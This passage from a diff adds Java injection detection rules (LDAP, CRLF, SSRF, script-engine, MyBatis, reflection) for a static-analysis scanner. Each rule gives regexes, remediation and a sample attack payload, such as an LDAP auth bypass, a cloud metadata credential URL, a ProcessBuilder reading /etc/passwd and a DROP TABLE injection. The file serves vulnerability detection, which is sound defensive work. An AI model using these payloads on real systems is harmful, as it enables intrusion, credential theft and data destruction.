+      Attacker sends username='' or ''1''=''1 to bypass authentication.
+
+      '
+    example_payload: ''' or ''1''=''1'
+    attacker_objective: Bypass authentication or extract data from XML store
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-006
+    - JAVA-INJ-001
+- rule_id: JAVA-INJ-010
+  title: LDAP Injection via String Concatenation
+  description: 'Detects LDAP search filter or DN construction via string concatenation with user-controlled input in javax.naming
+    or Spring LDAP APIs.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.89
+  cwe: CWE-90
+  owasp: A03:2021-Injection
+  tags:
+  - ldap-injection
+  - authentication-bypass
+  - directory
+  - java
+  - spring-ldap
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: \.search\s*\(\s*[^,]*,\s*"[^"]*"\s*\+\s*(?:request|param|input|user|username)\b
+    description: DirContext.search with concatenated filter
+  - type: regex
+    pattern: String\.format\s*\(\s*"\([^"]*%s[^"]*\)"\s*,\s*(?:request|param|input|user|username)\b
+    description: LDAP filter built via String.format
+  - type: regex
+    pattern: (?:ctx|dirContext|context)\.search\s*\([^,]*,\s*"(?:\(|&|\|)[^"]*"\s*\+\s*\w+
+    description: LDAP search with dynamic filter via concatenation
+  - type: regex
+    pattern: LdapQueryBuilder\.query\s*\(\s*\)[\s\S]{0,200}\.filter\s*\(\s*"[^"]*"\s*\+\s*(?:request|param|input|user)\b
+    description: Spring LDAP query builder with concatenated filter
+  - type: regex
+    pattern: '"(?:uid|cn|sAMAccountName|mail)="\s*\+\s*(?:request|param|input|user|username)\b'
+    description: Common LDAP attribute with user-controlled value via concatenation
+  anti_patterns:
+  - LdapEncoder.filterEncode
+  - LdapNameBuilder
+  - encodeForLDAP
+  - ESAPI.encoder
+  - LdapUtils.escapeLDAPSearchFilter
+  - sanitize
+  - allowList
+  bypass_variants:
+  - description: LDAP wildcard injection
+    pattern: \\*\\)\\(\\|?\\(\\w+=\\*
+  - description: DN injection
+    pattern: \\),CN=.*,DC=
+  evasion_indicators:
+  - LDAP metacharacter injection (*, (), |, &)
+  - DN injection via unescaped commas
+  encoding_variants:
+  - type: hex_ldap
+    pattern: \\\\[0-9a-fA-F]{2}
+  multi_function_chain_patterns:
+  - request.getParameter('username') -> "(uid=" + username + ")" -> ctx.search()
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Authentication bypass and directory enumeration
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.getParameter(), @RequestParam
+    sink: DirContext.search(), LdapTemplate.search()
+    through: String concatenation or String.format
+  impact: 'LDAP injection allows authentication bypass, user enumeration, and
+
+    extraction of directory attributes including passwords and group memberships.
+
+    '
+  remediation: 'Use LdapEncoder.filterEncode() from Spring LDAP for filter values.
+
+    Use LdapNameBuilder for DN construction. Apply strict input validation.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/90.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - import javax.naming
+    - import javax.naming.directory
+    - import org.springframework.ldap
+    taint_source_indicators:
+    - request.getParameter(
+    - '@RequestParam'
+    - '@RequestBody'
+    taint_sink_indicators:
+    - DirContext.search(
+    - LdapTemplate.search(
+    - ctx.search(
+    sanitization_patterns:
+    - LdapEncoder.filterEncode(
+    - LdapNameBuilder
+    - escapeLDAPSearchFilter
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'Login uses ctx.search(base, "(uid=" + username + ")", controls).
+
+      Attacker sends username=*)(uid=*))(|(uid=* to bypass authentication.
+
+      '
+    example_payload: '*)(uid=*))(|(uid=*'
+    attacker_objective: Bypass LDAP authentication or enumerate directory
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-001
+    - JAVA-INJ-003
+- rule_id: JAVA-INJ-011
+  title: HTTP Header / CRLF Injection
+  description: 'Detects HTTP response header injection via user-controlled values in setHeader, addHeader, sendRedirect, or
+    addCookie enabling CRLF injection.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-113
+  owasp: A03:2021-Injection
+  tags:
+  - crlf-injection
+  - header-injection
+  - response-splitting
+  - java
+  detection_layer: 2
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: response\.(?:setHeader|addHeader)\s*\(\s*[^,]*,\s*(?:request|param|input|user|data)\b
+    description: Response header set from user-controlled input
+  - type: regex
+    pattern: response\.sendRedirect\s*\(\s*(?:request|param|input|user|url|redirect)\b
+    description: Redirect with user-controlled URL
+  - type: regex
+    pattern: response\.setHeader\s*\(\s*"(?:Location|Content-Disposition|Set-Cookie)"[^,]*,\s*[^)]*\+\s*(?:request|param|input|user)\b
+    description: Sensitive header with concatenated user input
+  - type: regex
+    pattern: HttpHeaders\.(?:add|set)\s*\(\s*[^,]*,\s*(?:request|param|input|user)\b
+    description: Spring HttpHeaders with user-controlled value
+  anti_patterns:
+  - URLEncoder.encode
+  - UriUtils.encode
+  - ESAPI.encoder
+  - sanitize
+  - stripNewlines
+  - replace.*\r
+  - replace.*\n
+  bypass_variants:
+  - description: CRLF via URL-encoded newline
+    pattern: '%0[dD]%0[aA]'
+  - description: Unicode newline injection
+    pattern: \\\\u000[dD]\\\\u000[aA]
+  evasion_indicators:
+  - URL-encoded CRLF
+  - Unicode newline variants
+  encoding_variants:
+  - type: url_encoding
+    pattern: '%0[dD]%0[aA]'
+  multi_function_chain_patterns:
+  - request.getParameter('url') -> response.sendRedirect(url)
+  - request.getParameter('file') -> response.setHeader('Content-Disposition', file)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Response splitting enables XSS and session fixation
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.getParameter(), @RequestParam
+    sink: response.setHeader(), response.sendRedirect()
+    through: Direct header value assignment
+  impact: 'CRLF injection enables HTTP response splitting, XSS via injected headers,
+
+    cache poisoning, and session fixation attacks.
+
+    '
+  remediation: 'Use URLEncoder.encode() or Spring''s UriUtils.encode() for header values.
+
+    Strip \\r and \\n characters. Use framework redirect methods instead of
+
+    manual Location headers.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/113.html
+  - https://owasp.org/www-community/attacks/HTTP_Response_Splitting
+  context_awareness:
+    surrounding_context_patterns:
+    - import javax.servlet.http
+    - import jakarta.servlet.http
+    - HttpServletResponse
+    taint_source_indicators:
+    - request.getParameter(
+    - '@RequestParam'
+    - '@RequestHeader'
+    taint_sink_indicators:
+    - response.setHeader(
+    - response.addHeader(
+    - response.sendRedirect(
+    sanitization_patterns:
+    - URLEncoder.encode(
+    - UriUtils.encode(
+    - stripNewlines
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'App sets response.setHeader("X-Custom", request.getParameter("val")).
+
+      Attacker sends val=test%0d%0aSet-Cookie:%20session=hijacked for session fixation.
+
+      '
+    example_payload: 'test\r\nSet-Cookie: session=hijacked'
+    attacker_objective: Inject HTTP headers for response splitting or session fixation
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-001
+    - JAVA-INJ-007
+- rule_id: JAVA-INJ-012
+  title: Server-Side Request Forgery (SSRF)
+  description: 'Detects SSRF where user-controlled URLs are passed to URL, HttpClient, RestTemplate, or WebClient enabling
+    access to internal services.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.87
+  cwe: CWE-918
+  owasp: A10:2021-Server-Side-Request-Forgery
+  tags:
+  - ssrf
+  - url-injection
+  - internal-access
+  - java
+  - spring
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: new\s+URL\s*\(\s*(?:request|param|input|user|url|target|endpoint)\b
+    description: URL object from user-controlled input
+  - type: regex
+    pattern: HttpClient\s*.*\.(?:send|execute)\s*\([^)]*(?:request|param|input|user|url)\b
+    description: HttpClient request with user-controlled URL
+  - type: regex
+    pattern: RestTemplate\s*\(\s*\)\.(?:getForObject|getForEntity|postForObject|exchange)\s*\(\s*(?:request|param|input|user|url)\b
+    description: RestTemplate with user-controlled URL
+  - type: regex
+    pattern: WebClient\.(?:create|builder)\s*\([^)]*\)[\s\S]{0,200}\.uri\s*\(\s*(?:request|param|input|user|url)\b
+    description: WebClient with user-controlled URI
+  - type: regex
+    pattern: (?:Jsoup|OkHttp|HttpURLConnection).*(?:connect|newCall|openConnection)\s*\([^)]*(?:request|param|input|user|url)\b
+    description: HTTP library with user-controlled URL
+  anti_patterns:
+  - URL_ALLOWLIST
+  - ALLOWED_HOSTS
+  - isInternalUrl
+  - validateUrl
+  - InetAddress.getByName
+  - isPrivateAddress
+  - SSRFFilter
+  bypass_variants:
+  - description: DNS rebinding
+    pattern: InetAddress.*getByName.*(?:request|user)
+  - description: URL parser confusion
+    pattern: '@.*localhost|0x7f000001|2130706433'
+  evasion_indicators:
+  - DNS rebinding
+  - IP address encoding schemes
+  - URL parser differentials
+  encoding_variants:
+  - type: decimal_ip
+    pattern: 2130706433|0177\\.0\\.0\\.1
+  - type: hex_ip
+    pattern: 0x7f000001|0x7f\\.0\\.0\\.1
+  multi_function_chain_patterns:
+  - request.getParameter('url') -> new URL(url) -> url.openConnection()
+  - request.getParameter('target') -> restTemplate.getForObject(target)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Access internal services, cloud metadata endpoints
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.getParameter(), @RequestParam
+    sink: new URL(), RestTemplate.getForObject(), WebClient.uri()
+    through: Direct URL construction from user input
+  impact: 'SSRF enables access to internal services (databases, admin panels, cloud
+
+    metadata), port scanning, and credential theft from metadata endpoints.
+
+    '
+  remediation: 'Validate URLs against an allowlist of permitted domains. Block access to
+
+    private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, localhost).
+
+    Use DNS resolution validation to prevent DNS rebinding.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/918.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - import java.net.URL
+    - import java.net.http
+    - import org.springframework.web.client
+    taint_source_indicators:
+    - request.getParameter(
+    - '@RequestParam'
+    - '@RequestBody'
+    taint_sink_indicators:
+    - new URL(
+    - RestTemplate.getForObject(
+    - WebClient.uri(
+    - HttpClient.send(
+    sanitization_patterns:
+    - URL_ALLOWLIST
+    - ALLOWED_HOSTS
+    - validateUrl
+    - isPrivateAddress
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - url_validation_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A proxy endpoint fetches user-provided URLs. Attacker sends
+
+      url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ to steal AWS creds.
+
+      '
+    example_payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    attacker_objective: Access internal services and cloud metadata for credential theft
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-006
+    - JAVA-INJ-002
+- rule_id: JAVA-INJ-013
+  title: ScriptEngine / Groovy Code Injection
+  description: 'Detects code injection through javax.script.ScriptEngine.eval(), GroovyShell.evaluate(), or BeanShell Interpreter.eval()
+    with user input.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.93
+  cwe: CWE-94
+  owasp: A03:2021-Injection
+  tags:
+  - code-injection
+  - scriptengine
+  - groovy
+  - beanshell
+  - nashorn
+  - rce
+  detection_layer: 1
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?:scriptEngine|engine|jsEngine)\s*\.eval\s*\(\s*(?:request|param|input|user|data|script|code|expr)\b
+    description: ScriptEngine.eval with user-controlled script
+  - type: regex
+    pattern: new\s+GroovyShell\s*\([^)]*\)\s*\.(?:evaluate|parse)\s*\(\s*(?:request|param|input|user|data|script)\b
+    description: GroovyShell evaluate with user input
+  - type: regex
+    pattern: new\s+Interpreter\s*\(\s*\)\s*\.eval\s*\(\s*(?:request|param|input|user|data|script)\b
+    description: BeanShell Interpreter.eval with user input
+  - type: regex
+    pattern: ScriptEngineManager\s*\(\s*\)\s*\.getEngineByName\s*\([^)]*\)[\s\S]{0,150}\.eval\s*\(\s*(?:request|param|input|user)\b
+    description: ScriptEngineManager followed by eval with user input
+  - type: regex
+    pattern: new\s+GroovyClassLoader\s*\([^)]*\)\s*\.parseClass\s*\(\s*(?:request|param|input|user|data)\b
+    description: GroovyClassLoader parsing user-controlled class
+  anti_patterns:
+  - SandboxTransformer
+  - SecureASTCustomizer
+  - CompilerConfiguration
+  - GroovySandbox
+  - ALLOWED_FUNCTIONS
+  - scriptAllowlist
+  - SecurityManager
+  bypass_variants:
+  - description: Groovy meta-programming bypass
+    pattern: \\.getClass\\(\\)\\.forName\\(
+  - description: Nashorn Java.type access
+    pattern: Java\\.type\\s*\\(.*Runtime
+  evasion_indicators:
+  - Groovy metaclass manipulation
+  - Nashorn Java interop
+  - BeanShell reflection
+  encoding_variants:
+  - type: base64
+    pattern: base64.*eval|eval.*base64
+  multi_function_chain_patterns:
+  - request.getParameter('script') -> engine.eval(script)
+  - request.getParameter('expr') -> new GroovyShell().evaluate(expr)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Arbitrary JVM code execution via scripting engine
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.getParameter(), @RequestParam
+    sink: ScriptEngine.eval(), GroovyShell.evaluate()
+    through: Direct script evaluation
+  impact: 'Script engine injection provides full JVM code execution including
+
+    Runtime.exec(), file I/O, network access, and reflection capabilities.
+
+    '
+  remediation: 'Never evaluate user-controlled scripts. Use Groovy SecureASTCustomizer
+
+    with CompilerConfiguration for restricted execution. Prefer typed APIs
+
+    over scripting engines.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/94.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  context_awareness:
+    surrounding_context_patterns:
+    - import javax.script
+    - import groovy.lang
+    - import bsh.Interpreter
+    taint_source_indicators:
+    - request.getParameter(
+    - '@RequestParam'
+    - '@RequestBody'
+    taint_sink_indicators:
+    - ScriptEngine.eval(
+    - GroovyShell.evaluate(
+    - Interpreter.eval(
+    sanitization_patterns:
+    - SecureASTCustomizer
+    - SandboxTransformer
+    - ALLOWED_FUNCTIONS
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sandbox_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A rule engine evaluates user expressions via engine.eval(request.getParameter("expr")).
+
+      Attacker sends: new ProcessBuilder("bash","-c","id").start()
+
+      '
+    example_payload: new ProcessBuilder(['bash','-c','cat /etc/passwd']).start()
+    attacker_objective: Execute arbitrary code via scripting engine
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-004
+    - JAVA-INJ-002
+- rule_id: JAVA-INJ-014
+  title: MyBatis ${} SQL Injection
+  description: 'Detects MyBatis mapper XML or annotation queries using ${} interpolation instead of #{} parameterization,
+    enabling SQL injection.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.94
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - mybatis
+  - orm
+  - dollar-interpolation
+  - java
+  detection_layer: 1
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: \\$\\{\\w*(?:param|input|user|arg|order|sort|table|column|where|id)\\w*\\}
+    description: MyBatis ${} with tainted variable name
+  - type: regex
+    pattern: <(?:select|insert|update|delete)\b[^>]*>[\s\S]*?\\$\\{[^}]+\\}
+    description: MyBatis mapper XML with ${} interpolation
+  - type: regex
+    pattern: '@(?:Select|Insert|Update|Delete)\s*\(\s*"[^"]*\\$\\{[^}]+\\}[^"]*"'
+    description: MyBatis annotation with ${} interpolation
+  - type: regex
+    pattern: ORDER\\s+BY\\s+\\$\\{[^}]*(?:sort|order|column|field)\\}
+    description: Dynamic ORDER BY via MyBatis ${}
+  - type: regex
+    pattern: WHERE\\s+\\$\\{[^}]*(?:condition|filter|where|clause)\\}
+    description: Dynamic WHERE clause via MyBatis ${}
+  anti_patterns:
+  - '#{param}'
+  - '#{id}'
+  - '#{name}'
+  - MappedStatement
+  - TypeHandler
+  - ParameterMap
+  bypass_variants:
+  - description: ORDER BY injection via ${}
+    pattern: ORDER\\s+BY\\s+\\$\\{\\w+\\}
+  - description: Table name injection
+    pattern: FROM\\s+\\$\\{\\w+\\}
+  evasion_indicators:
+  - Dynamic ORDER BY
+  - Dynamic table names
+  - Dynamic WHERE
+  encoding_variants:
+  - type: unicode
+    pattern: \\u0024\\u007b
+  multi_function_chain_patterns:
+  - request.getParameter('sort') -> MyBatis ${sort} -> SQL ORDER BY
+  - request.getParameter('table') -> MyBatis ${table} -> SQL FROM
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: SQL injection via ORM interpolation bypass
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: '@RequestParam, @PathVariable'
+    sink: MyBatis ${} interpolation
+    through: Mapper parameter mapping
+  impact: 'MyBatis ${} performs raw string interpolation into SQL enabling full SQL
+
+    injection including UNION attacks, data exfiltration, and RCE via DB features.
+
+    '
+  remediation: 'Always use #{} for parameterized values. For dynamic ORDER BY or table names,
+
+    use MyBatis <choose>/<when> with allowlisted values or a Java-side allowlist map.
+
+    '
+  references:
+  - https://mybatis.org/mybatis-3/sqlmap-xml.html#Parameters
+  - https://cwe.mitre.org/data/definitions/89.html
+  context_awareness:
+    surrounding_context_patterns:
+    - import org.apache.ibatis
+    - mybatis-config
+    - <mapper
+    - '@Select'
+    - '@Mapper'
+    taint_source_indicators:
+    - '@RequestParam'
+    - '@PathVariable'
+    - '@RequestBody'
+    taint_sink_indicators:
+    - ${
+    - '@Select("'
+    - '@Insert("'
+    - '@Update("'
+    - '@Delete("'
+    sanitization_patterns:
+    - '#{'
+    - <choose>
+    - <when>
+    - allowlist
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - parameterization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'MyBatis mapper uses <select>SELECT * FROM users ORDER BY ${sortColumn}</select>.
+
+      Attacker sends sortColumn=id; DROP TABLE users-- to inject SQL.
+
+      '
+    example_payload: id; DROP TABLE users--
+    attacker_objective: SQL injection via MyBatis dollar interpolation
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: simple
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-001
+    - JAVA-INJ-005
+- rule_id: JAVA-INJ-015
+  title: Reflection-based Method Invocation Injection
+  description: 'Detects use of Java reflection (Class.forName, Method.invoke, Constructor.newInstance) with user-controlled
+    class names, method names, or arguments enabling arbitrary code execution.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.86
+  cwe: CWE-470
+  owasp: A03:2021-Injection
+  tags:
+  - reflection-injection
+  - code-injection
+  - rce
+  - class-loading
+  - java
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: Class\.forName\s*\(\s*(?:request|param|input|user|data|className|clazz)\b
+    description: Class.forName with user-controlled class name
+  - type: regex
+    pattern: \.getMethod\s*\(\s*(?:request|param|input|user|methodName|action)\b
+    description: getMethod with user-controlled method name
+  - type: regex
+    pattern: \.getDeclaredMethod\s*\(\s*(?:request|param|input|user|methodName)\b
+    description: getDeclaredMethod with user-controlled method name
+  - type: regex
+    pattern: method\.invoke\s*\(\s*[^,]*,\s*(?:request|param|input|user|data)\b
+    description: Method.invoke with user-controlled arguments
+  - type: regex
+    pattern: \.newInstance\s*\(\s*\)[\s\S]{0,100}Class\.forName\s*\(\s*(?:request|param|input|user)\b
+    description: Dynamic class instantiation from user-controlled name
+  anti_patterns:
+  - CLASS_ALLOWLIST
+  - ALLOWED_CLASSES
+  - METHOD_ALLOWLIST
+  - allowedMethods
+  - SecurityManager
+  - switch.*case
+  bypass_variants:
+  - description: Reflection via getClass().getName()
+    pattern: \\.getClass\\(\\)\\.get(?:Method|Constructor)\\(
+  - description: Class loader injection
+    pattern: URLClassLoader\\s*\\(.*user
+  evasion_indicators:
+  - Dynamic class loading
+  - Reflection method chaining
+  - Custom ClassLoader
+  encoding_variants:
+  - type: obfuscation
+    pattern: Class\\.forName.*String\\.valueOf
+  multi_function_chain_patterns:
+  - request.getParameter('class') -> Class.forName(class) -> newInstance()
+  - request.getParameter('method') -> getMethod(method) -> invoke()
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Arbitrary class instantiation and method invocation
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.getParameter(), @RequestParam
+    sink: Class.forName(), Method.invoke()
+    through: String concatenation or direct pass
+  impact: 'Reflection injection enables arbitrary class loading and method invocation,
+
+    leading to RCE via Runtime.exec(), file access, and system compromise.
+
+    '
+  remediation: 'Use strict allowlists for permitted class and method names. Replace
+
+    reflection with typed dispatch maps or strategy pattern. Never use
+
+    Class.forName with user input directly.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/470.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  context_awareness:
+    surrounding_context_patterns:
+    - import java.lang.reflect
+    - Class.forName
+    - Method.invoke
+    taint_source_indicators:
+    - request.getParameter(
+    - '@RequestParam'
+    - '@PathVariable'
+    taint_sink_indicators:
+    - Class.forName(
+    - Method.invoke(
+    - Constructor.newInstance(
+    - getMethod(
+    sanitization_patterns:
+    - CLASS_ALLOWLIST
+    - ALLOWED_CLASSES
+    - METHOD_ALLOWLIST
+    - switch.*case
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 - allowlist_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A plugin system loads classes via Class.forName(request.getParameter("plugin")).
+
+      Attacker sends plugin=java.lang.Runtime to access Runtime.exec().
+
+      '
+    example_payload: java.lang.ProcessBuilder
+    attacker_objective: Execute arbitrary code via reflection-based class loading
+  confidence_factors:
+    pattern_strength: high
+    context_match: medium
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-004
+    - JAVA-INJ-013
+    - JAVA-INJ-008
